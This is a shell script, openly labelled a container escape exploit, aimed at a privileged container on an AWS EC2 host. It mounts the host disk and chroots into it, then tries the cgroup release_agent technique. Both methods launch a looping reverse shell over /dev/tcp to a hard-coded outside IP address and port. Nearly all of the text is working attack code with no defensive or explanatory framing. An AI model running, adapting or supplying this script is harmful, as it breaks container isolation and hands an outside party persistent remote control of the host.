#!/bin/sh

echo "[*] Container Escape Exploit - Reverse Shell to 18.215.158.224:4445"
echo "[*] This script provides direct shell access to the EC2 host"

# Check if running in a privileged container
echo "[*] Checking for privileged status..."
if [ ! -f /proc/self/status ]; then
    echo "[-] Cannot access /proc/self/status. Are you in a container?"
    exit 1
fi

cap_eff=$(grep CapEff /proc/self/status | awk '{print $2}')
echo "[*] Container capability set: $cap_eff"

# More lenient check - this container seems to have high capabilities even if not the exact pattern
if [[ "$cap_eff" == *"ffffffff"* ]]; then
    echo "[+] Container appears to have high capabilities. Proceeding with exploit..."
else
    echo "[-] This container does not appear to have sufficient capabilities."
    echo "[-] Expected a capability set ending with ffffffff"
    exit 1
fi

# Method 1: Mount the host filesystem
echo "[*] Attempting to access host filesystem via disk device..."
mkdir -p /tmp/host_root

echo "[*] Attempting to automatically identify a suitable disk device..."
potential_devices=$(find /dev -name "xvda*" -o -name "sda*" -o -name "vda*" -o -name "nvme*" 2>/dev/null)

if [ -n "$potential_devices" ]; then
    for device in $potential_devices; do
        if [[ "$device" == *"1" ]] || [[ "$device" == *"p1" ]]; then
            suggested_device="$device"
            break
        fi
    done
else
    root_dev=$(df / | tail -1 | awk '{print $1}')
    if [[ "$root_dev" == /dev/* ]]; then
        suggested_device="$root_dev"
    fi
fi

if [ -n "$suggested_device" ]; then
    disk_device="$suggested_device"
else
    echo "[*] Enter the main host disk device to mount (e.g., /dev/xvda1, /dev/sda1):"
    read disk_device
fi

if [ -b "$disk_device" ]; then
    echo "[*] Attempting to mount $disk_device to /tmp/host_root"
    if mount "$disk_device" /tmp/host_root; then
        echo "[+] Successfully mounted host filesystem!"
        echo "[*] Escaping into the host environment..."
        
        # Reverse shell payload from the host machine
        chroot /tmp/host_root /bin/sh -c "
        (while true; do 
            /bin/sh -i >& /dev/tcp/18.215.158.224/4445 0>&1
            sleep 5;
        done) &
        "
        echo "[+] Reverse shell initiated from the EC2 host!"
    else
        echo "[-] Failed to mount host filesystem."
    fi
fi

# Method 2: Using cgroups Release Agent (simplified)
echo "[*] Attempting cgroups Release Agent method..."
mkdir -p /tmp/escape

for subsystem in rdma memory cpu devices freezer net_cls; do
    echo "[*] Trying to mount cgroup with $subsystem subsystem..."
    if mount -t cgroup -o $subsystem cgroup /tmp/escape 2>/dev/null; then
        echo "[+] Successfully mounted cgroup filesystem using $subsystem subsystem"
        break
    fi
done

if ! mountpoint -q /tmp/escape; then
    echo "[*] Trying to mount cgroup without specifying a subsystem..."
    mount -t cgroup cgroup /tmp/escape 2>/dev/null
fi

if ! mountpoint -q /tmp/escape; then
    echo "[-] Could not mount cgroup filesystem. Failed to escape."
    exit 1
fi

if [ -f /tmp/escape/release_agent ]; then
    work_dir="/tmp/escape"
else
    mkdir -p /tmp/escape/x
    work_dir="/tmp/escape/x"
fi

echo 1 > $work_dir/notify_on_release
host_path="/tmp/escape/release_agent"

cat > /tmp/payload.sh << 'EOF'
#!/bin/sh
while true; do
    /bin/sh -i >& /dev/tcp/18.215.158.224/4445 0>&1
    sleep 5
done
EOF

chmod +x /tmp/payload.sh
echo "/tmp/payload.sh" > $host_path
chmod +x $host_path

echo "[*] Triggering exploit..."
echo $$ > $work_dir/cgroup.procs 2>/dev/null || echo $$ > $work_dir/tasks 2>/dev/null

echo "[*] Waiting for shell..."
sleep 3
echo "[+] Reverse shell initiated! Check your Netcat listener."
